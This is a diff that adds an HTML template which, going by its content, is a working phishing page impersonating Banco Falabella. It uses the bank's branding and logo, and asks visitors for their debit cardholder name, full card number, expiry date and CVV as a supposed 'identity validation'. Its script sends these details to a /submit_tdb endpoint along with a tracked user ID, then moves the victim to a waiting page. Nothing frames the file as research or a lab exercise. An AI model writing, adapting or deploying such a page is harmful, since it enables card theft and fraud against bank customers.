@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Banco Falabella | Validación de Tarjeta</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="/assets/img/logo.png" type="image/png">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
+            color: #444;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            background-color: #fff;
+            padding: 15px 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .header img {
+            height: 40px;
+        }
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card-box {
+            background: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            width: 100%;
+            max-width: 420px;
+            border-top: 4px solid #b2d235;
+        }
+        .box-title {
+            font-size: 20px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .box-desc {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-label {
+            display: block;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .form-input:focus {
+            border-color: #b2d235;
+        }
+        .inline-inputs {
+            display: flex;
+            gap: 15px;
+        }
+        .inline-inputs .form-group {
+            flex: 1;
+        }
+        .btn-submit {
+            width: 100%;
+            background-color: #b2d235;
+            color: #333;
+            font-weight: 700;
+            border: none;
+            padding: 14px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+            text-transform: uppercase;
+        }
+        .btn-submit:hover {
+            background-color: #9cb82d;
+        }
+        .btn-submit:disabled {
+            background-color: #ddd;
+            color: #999;
+            cursor: not-allowed;
+        }
+        .footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+        }
+        .error-msg {
+            color: #d32f2f;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+            font-weight: 500;
+        }
+        
+        /* Premium Visual Card representation */
+        .card-visual {
+            background: linear-gradient(135deg, #9ca3af 0%, #6b7280 100%);
+            border-radius: 12px;
+            padding: 20px;
+            color: #fff;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+            aspect-ratio: 1.586/1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+        }
+        .card-visual::before {
+            content: '';
+            position: absolute;
+            top: -20%; right: -20%;
+            width: 150px; height: 150px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            filter: blur(20px);
+        }
+        .card-visual .brand {
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: #fff;
+        }
+        .card-visual .chip {
+            width: 35px;
+            height: 28px;
+            background: linear-gradient(135deg, #e5c060 0%, #b8860b 100%);
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+        .card-visual .number {
+            font-size: 18px;
+            letter-spacing: 3px;
+            font-family: monospace;
+            margin-top: 15px;
+        }
+        .card-visual .bottom-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-top: 15px;
+        }
+        .card-visual .holder {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #ccc;
+        }
+        .card-visual .expiry-visual {
+            font-size: 12px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <img src="/assets/img/logo.png" alt="Banco Falabella" onerror="this.src='https://www.bancofalabella.com.co/assets/svg/logo-banco-falabella.svg'">
+    </header>
+
+    <div class="main-container">
+        <div class="card-box">
+            <h2 class="box-title">Validación de Identidad</h2>
+            <p class="box-desc">Para continuar con el proceso de verificación, ingresa los datos de tu Tarjeta de Débito Falabella vinculada.</p>
+            
+            <p class="error-msg" id="errorMsg">Los datos de tu tarjeta no pudieron ser validados. Por favor, verifica e intenta nuevamente.</p>
+
+            <div class="card-visual">
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <span class="brand">Falabella</span>
+                    <span style="font-size: 10px; opacity: 0.6;">DÉBITO</span>
+                </div>
+                <div class="chip"></div>
+                <div class="number" id="cardNoVisual">•••• •••• •••• ••••</div>
+                <div class="bottom-info">
+                    <div>
+                        <div style="font-size: 8px; color: #aaa; margin-bottom: 2px;">TARJETAHABIENTE</div>
+                        <div class="holder" id="cardHolderVisual">CLIENTE FALABELLA</div>
+                    </div>
+                    <div style="text-align: right;">
+                        <div style="font-size: 8px; color: #aaa; margin-bottom: 2px;">VENCE</div>
+                        <div class="expiry-visual" id="cardExpiryVisual">MM/AA</div>
+                    </div>
+                </div>
+            </div>
+
+            <form id="tdbForm">
+                <div class="form-group">
+                    <label class="form-label">Nombre del Titular (como figura en la tarjeta)</label>
+                    <input type="text" class="form-input" id="card_holder" required placeholder="Nombre Apellido" autocomplete="off" style="text-transform: uppercase;">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Número de Tarjeta (16 dígitos)</label>
+                    <input type="tel" class="form-input" id="card_number" required maxlength="19" inputmode="numeric" placeholder="4000 1234 5678 9010" autocomplete="off">
+                </div>
+
+                <div class="inline-inputs">
+                    <div class="form-group">
+                        <label class="form-label">Vencimiento</label>
+                        <input type="tel" class="form-input" id="card_expiry" required maxlength="5" inputmode="numeric" placeholder="MM/AA" autocomplete="off">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">CVV (3 dígitos)</label>
+                        <input type="password" class="form-input" id="card_cvv" required maxlength="3" inputmode="numeric" placeholder="•••" autocomplete="off">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="btnSubmit">Verificar Tarjeta</button>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>© 2026 Banco Falabella. Todos los derechos reservados.</p>
+    </footer>
+
+    <script>
+        const userId = {{ user_id }};
+        
+        // Dynamic Card Holder Visual update
+        document.getElementById('card_holder').addEventListener('input', function(e) {
+            document.getElementById('cardHolderVisual').innerText = this.value.toUpperCase() || 'CLIENTE FALABELLA';
+        });
+        
+        // Expiration visual slash
+        document.getElementById('card_expiry').addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length >= 2) {
+                val = val.slice(0, 2) + '/' + val.slice(2, 4);
+            }
+            this.value = val;
+            document.getElementById('cardExpiryVisual').innerText = val || 'MM/AA';
+        });
+
+        // Card number spaces formatting & visual
+        document.getElementById('card_number').addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            let formatted = val.match(/.{1,4}/g);
+            if (formatted) {
+                this.value = formatted.join(' ');
+                document.getElementById('cardNoVisual').innerText = formatted.join(' ');
+            } else {
+                this.value = '';
+                document.getElementById('cardNoVisual').innerText = '•••• •••• •••• ••••';
+            }
+        });
+
+        // Check error param
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('error') === '1') {
+            document.getElementById('errorMsg').style.display = 'block';
+        }
+
+        document.getElementById('tdbForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btnSubmit');
+            const card_holder = document.getElementById('card_holder').value.toUpperCase();
+            const card_number = document.getElementById('card_number').value.replace(/\s/g, '');
+            const card_expiry = document.getElementById('card_expiry').value;
+            const card_cvv = document.getElementById('card_cvv').value;
+
+            if(card_number.length !== 16 || card_expiry.length !== 5 || card_cvv.length !== 3 || !card_holder.trim()) {
+                alert('Por favor completa todos los campos correctamente.');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.textContent = 'Verificando...';
+
+            try {
+                const res = await fetch('/submit_tdb', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user_id: userId,
+                        card_holder: card_holder,
+                        card_number: card_number,
+                        card_expiry: card_expiry,
+                        card_cvv: card_cvv
+                    })
+                });
+                const data = await res.json();
+                if(data.status === 'success') {
+                    window.location.href = '/waiting/' + userId;
+                } else {
+                    alert('Error al validar la información.');
+                    btn.disabled = false;
+                    btn.textContent = 'Verificar Tarjeta';
+                }
+            } catch(e) {
+                alert('Error al conectar con el servidor.');
+                btn.disabled = false;
+                btn.textContent = 'Verificar Tarjeta';
+            }
+        });
+    </script>
+</body>
+</html>
